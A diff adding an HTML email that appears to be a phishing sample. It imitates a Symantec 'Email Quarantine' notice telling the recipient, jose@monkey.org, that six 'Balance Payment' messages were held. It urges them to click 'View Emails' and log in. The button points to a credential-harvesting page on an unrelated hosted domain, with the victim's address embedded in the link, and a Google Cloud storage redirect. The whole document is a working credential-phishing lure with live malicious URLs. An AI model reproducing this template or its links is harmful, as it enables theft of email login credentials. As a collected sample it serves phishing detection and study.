@@ -1,0 +1,43 @@
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 11.00.9600.17037"></HEAD>
+<body>
+<table style="FONT-SIZE: 12px; BORDER-TOP: rgb(204,204,204) 1px solid; FONT-FAMILY: ??,??; BORDER-RIGHT: rgb(204,204,204) 1px solid; BORDER-BOTTOM: rgb(204,204,204) 1px solid; WORD-BREAK: break-all; COLOR: rgb(68,68,68); BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px solid; LINE-HEIGHT: 17px; BACKGROUND-COLOR: rgb(228,228,228)" cellspacing="0" cellpadding="0" width="100%" border="0">
+<TBODY>
+<TR height=32>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; PADDING-LEFT: 15px; LINE-HEIGHT: 17px; PADDING-RIGHT: 15px" valign="middle" width="32" align="left">
+<img style="BORDER-TOP: 0px; FONT-FAMILY: ??,Dotum,Helvetica,AppleGothic,sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(85,86,88); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; DISPLAY: block; PADDING-RIGHT: 0px" border="0" src="https://ci3.googleusercontent.com/proxy/Vet6rLKxoR5KXZeZFY43mA0yc0naVKD-1EmW-mOY4uuHqJMyoh7EiWULKCqH1EcBajc87MMaaulbdOz3Xc8U5MtRE6o6AwViHIillGqyhvCWvaoHS1x_MxMzlYW-jBWGiD4VWCY=s0-d-e1-ft#https://eu.quarantine.symantec.com/img/eu.quarantine.symantec.com/product-logo.png" width="32" height="32"></TD>
+<td style="FONT-FAMILY: &quot;Symantec Sans&quot;; WORD-BREAK: break-all; LINE-HEIGHT: 17px" valign="middle" align="left"><FONT size=4><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">Email Quarantine</FONT></FONT></FONT></TD></TR>
+<TR style="PADDING-LEFT: 15px" height=3>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; LINE-HEIGHT: 17px"><BR></TD>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; LINE-HEIGHT: 17px"><BR></TD></TR></TBODY></TABLE>
+<table style="FONT-SIZE: 12px; BORDER-TOP: rgb(204,204,204) 1px solid; FONT-FAMILY: ??,??; BORDER-RIGHT: rgb(204,204,204) 1px solid; BORDER-BOTTOM: rgb(204,204,204) 1px solid; WORD-BREAK: break-all; COLOR: rgb(68,68,68); BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px solid; LINE-HEIGHT: 17px" cellspacing="0" cellpadding="0" width="100%" bgcolor="#ffffff" border="0">
+<TBODY>
+<TR>
+<td style="FONT-FAMILY: Calibri; WORD-BREAK: break-all; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 15px; LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND-COLOR: rgb(236,243,249)"><B><FONT size=4><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">Dear <FONT color=#0000ff>jose@monkey.org</FONT></FONT></FONT></FONT></B></TD></TR>
+<TR>
+<td style="FONT-FAMILY: Calibri; WORD-BREAK: break-all; PADDING-BOTTOM: 5px; PADDING-TOP: 0px; PADDING-LEFT: 15px; LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND-COLOR: rgb(236,243,249)"><FONT size=4><BR><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit"><FONT color=#0000ff>monkey.org</FONT>&nbsp;</FONT></FONT></FONT> <FONT size=4>
+has prevented the delivery of 6 new emails to your inbox with subjects Re:Balance Payment as of 3/25/2023 7:20:26 a.m. Message was identified as Spam. You can review these here and choose what happens to Your EMAILS. You can also get more information about quarantined messages by clicking on the botton&nbsp;VIEW EMAILS and Compliance Center. You'll need to Login with your details to be able to access this Emails.&nbsp;&nbsp;<BR><BR></FONT></TD></TR>
+<TR>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; PADDING-LEFT: 15px; LINE-HEIGHT: 17px" width="300" align="left"><FONT size=4><BR></FONT></TD></TR>
+<TR>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 15px; LINE-HEIGHT: 0; PADDING-RIGHT: 15px"><FONT size=4>&nbsp;</FONT></TD></TR>
+<TR style="MARGIN-TOP: 10px; BACKGROUND-COLOR: rgb(228,228,228)">
+<td style="FONT-FAMILY: Calibri; WORD-BREAK: break-all; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 15px; LINE-HEIGHT: 20px; PADDING-RIGHT: 15px">
+<P style="BORDER-TOP: 0px; FONT-FAMILY: &#46027;&#50880;,Dotum,Helvetica,AppleGothic,sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(85,86,88); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px"></P><FONT size=4><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">Emails will be deleted automatically after 14 days.&nbsp;</FONT>
+<FONT style="VERTICAL-ALIGN: inherit">CLICK VIEW EMAILS portal.</FONT></FONT></FONT></TD></TR>
+<TR style="PADDING-BOTTOM: 10px; PADDING-TOP: 0px; PADDING-LEFT: 15px; MARGIN-TOP: 10px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(228,228,228)" align=left>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 15px; LINE-HEIGHT: 17px">
+<table style="FONT-FAMILY: ??,??; WORD-BREAK: break-all; BORDER-SPACING: 0px; LINE-HEIGHT: 17px" cellspacing="0" cellpadding="0" width="100%" border="0">
+<TBODY>
+<TR>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; LINE-HEIGHT: 17px">
+<table style="FONT-FAMILY: ??,??; WORD-BREAK: break-all; BORDER-SPACING: 0px; LINE-HEIGHT: 17px" cellspacing="0" cellpadding="0" border="0">
+<TBODY>
+<TR>
+<td style="FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WORD-BREAK: break-all; PADDING-BOTTOM: 7px; PADDING-TOP: 7px; PADDING-LEFT: 12px; LINE-HEIGHT: 17px; PADDING-RIGHT: 12px; border-radius: 3px" bgcolor="#f7941d" align="center">
+<A style="FONT-FAMILY: Calibri; COLOR: rgb(0,0,0); text-decoration-line: none" href="https://neduet.hosting.acm.org//.well-known/save/domain.html#jose@monkey.org" target=_blank data-saferedirecturl="https://www.google.com/url?q=https://storage.cloud.google.com/pu00/index%2520(1).html%23chan1320@chol.com&amp;source=gmail&amp;ust=1679793911660000&amp;usg=AOvVaw2VJeoEPLlTvAb86RHUyPkE"><FONT style="VERTICAL-ALIGN: inherit"><FONT style="VERTICAL-ALIGN: inherit">View Emails</FONT></FONT></A></TD></TR>
+</TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<DIV id=:104 class="Ar Au Ao" style="DISPLAY: block">
+<DIV id=:104 class="Ar Au Ao" style="DISPLAY: block">&nbsp;</DIV></DIV></BODY></HTML>
+
+
